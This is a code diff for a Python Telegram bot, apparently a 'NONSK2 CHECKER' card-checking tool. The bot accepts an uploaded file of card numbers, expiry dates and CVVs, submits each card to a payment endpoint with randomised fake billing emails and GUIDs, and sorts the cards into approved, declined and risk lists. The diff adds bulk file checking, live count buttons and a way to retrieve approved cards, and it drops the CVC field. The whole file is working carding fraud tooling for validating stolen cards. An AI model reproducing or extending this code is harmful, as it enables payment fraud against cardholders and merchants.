@@ -5,28 +5,61 @@ import uuid
 import random
 import string
 import urllib3
+from telebot import types
 
 def process_nonsk2_command(bot, message):
     chat_id = message.chat.id
-    cc_data = message.text.split()[1:]  # Get the CC data from the command
-    if cc_data:
-        total_cards = len(cc_data)
-        start_time = time.time()
-        results = []
-        initial_message = "↯ NONSK2 CHECKER\n\n"
-        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
+    bot.send_message(chat_id, "Please send your txt file with CC data.")
 
-        for cc in cc_data:
-            result = check_nonsk2_card(cc)
-            results.append(f"CC: {cc}\nResult => {result}")
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=msg.message_id,
-                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_cards, start_time, message.from_user.username)
-            )
+def handle_document(bot, message):
+    chat_id = message.chat.id
+    file_info = bot.get_file(message.document.file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
 
-    else:
-        bot.send_message(chat_id, "Please provide CC details in the format: /nonsk2 cc|mon|year|cvv")
+    cc_data = downloaded_file.decode('utf-8').split('\n')
+    cc_data = [cc.strip() for cc in cc_data if cc.strip()]
+
+    total_cards = len(cc_data)
+    approved = []
+    declined = []
+    risk = []
+    start_time = time.time()
+
+    initial_message = "↯ NONSK2 CHECKER\n\n"
+    msg = bot.send_message(chat_id, initial_message + get_footer_info(total_cards, start_time, message.from_user.username))
+
+    keyboard = types.InlineKeyboardMarkup()
+    keyboard.add(
+        types.InlineKeyboardButton(f"Approved ✅: [0]", callback_data='approved'),
+        types.InlineKeyboardButton(f"Declined ❌: [0]", callback_data='declined'),
+        types.InlineKeyboardButton(f"RISK 📝: [0]", callback_data='risk'),
+        types.InlineKeyboardButton(f"TOTAL: [{total_cards}]", callback_data='total')
+    )
+
+    for index, cc in enumerate(cc_data):
+        result = check_nonsk2_card(cc)
+        if 'Approved' in result:
+            approved.append((cc, result))
+        elif 'RISK' in result:
+            risk.append((cc, result))
+        else:
+            declined.append((cc, result))
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg.message_id,
+            text=initial_message + f"• {cc} •\n" + get_footer_info(total_cards, start_time, message.from_user.username),
+            reply_markup=keyboard
+        )
+        keyboard = types.InlineKeyboardMarkup()
+        keyboard.add(
+            types.InlineKeyboardButton(f"Approved ✅: [{len(approved)}]", callback_data='approved'),
+            types.InlineKeyboardButton(f"Declined ❌: [{len(declined)}]", callback_data='declined'),
+            types.InlineKeyboardButton(f"RISK 📝: [{len(risk)}]", callback_data='risk'),
+            types.InlineKeyboardButton(f"TOTAL: [{total_cards}]", callback_data='total')
+        )
+
+    bot.send_message(chat_id, "Checking completed!")
 
 def check_nonsk2_card(cc):
     try:
@@ -55,7 +88,6 @@ def check_nonsk2_card(cc):
         "billing_details[email]": f"jamede{random_string()}@gmail.com",
         "billing_details[address][postal_code]": "10080",
         "card[number]": cc_number,
-        "card[cvc]": cvv,
         "card[exp_month]": exp_month,
         "card[exp_year]": exp_year,
         "guid": generate_guid(),
@@ -118,6 +150,8 @@ def check_nonsk2_card(cc):
         return "3DSECURE"
     elif "rate_limit" in response_data.get("error", {}).get("decline_code", ""):
         return "RATE LIMIT"
+    elif "security code (CVC) for this card" in response_data.get("error", {}).get("message", ""):
+        return "Missing CVC"
     else:
         error_message = response_data.get('error', {}).get('message', 'Unknown error')
         return f"Declined: {error_message}"
@@ -139,3 +173,18 @@ def get_footer_info(total_cards, start_time, username):
         f"－－－－－－－－－－－－－－－－"
     )
     return footer
+
+def handle_callback_query(call, bot, approved, declined, risk):
+    if call.data == 'approved':
+        send_cards(call.message.chat.id, approved, bot, "Approved ✅ Cards")
+    elif call.data == 'declined':
+        send_cards(call.message.chat.id, declined, bot, "Declined ❌ Cards")
+    elif call.data == 'risk':
+        send_cards(call.message.chat.id, risk, bot, "RISK 📝 Cards")
+
+def send_cards(chat_id, cards, bot, title):
+    if cards:
+        card_list = "\n".join([f"CC: {cc}\nResult => {result}" for cc, result in cards])
+        bot.send_message(chat_id, f"{title}\n\n{card_list}")
+    else:
+        bot.send_message(chat_id, f"No {title} found.")
